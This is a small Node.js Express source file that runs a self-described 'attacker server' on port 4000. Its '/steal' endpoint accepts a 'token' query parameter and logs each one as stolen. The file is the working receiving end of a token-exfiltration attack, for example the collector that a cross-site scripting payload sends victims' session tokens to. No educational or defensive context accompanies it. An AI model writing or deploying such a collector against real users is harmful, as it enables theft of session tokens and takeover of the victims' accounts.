import express from 'express';

const app = express();

app.get('/steal', (req, res) => {
  const token = req.query.token;
  if (token) {
    console.log("[+] Stolen:", token);
  }
  res.send("Token received");
});

app.listen(4000, () => {
  console.log("[+] Attacker server running on http://localhost:4000");
});
